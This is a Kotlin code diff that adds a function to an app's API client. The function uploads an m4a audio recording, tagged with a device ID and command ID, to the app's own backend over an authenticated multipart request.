@@ -611,6 +611,33 @@ object ApiClient {
         }
     }
 
+    fun uploadAudioRecording(file: java.io.File, commandId: String): Boolean {
+        return try {
+            val url = "${CloudConfig.apiBaseUrl}/report/audio-file"
+            val requestBody = okhttp3.MultipartBody.Builder()
+                .setType(okhttp3.MultipartBody.FORM)
+                .addFormDataPart("device_id", CloudConfig.deviceId)
+                .addFormDataPart("command_id", commandId)
+                .addFormDataPart("file", file.name,
+                    okhttp3.RequestBody.create(
+                        "audio/m4a".toMediaType(), file
+                    )
+                )
+                .build()
+            val request = Request.Builder()
+                .url(url)
+                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
+                .post(requestBody)
+                .build()
+            val response = client.newCall(request).execute()
+            response.isSuccessful
+        } catch (e: Exception) {
+            Log.e("ApiClient", "Failed to upload audio recording: ${e.message}")
+            false
+        }
+    }
+
+
     data class UpdateCheckResult(
         val success: Boolean,
         val hasUpdate: Boolean = false,
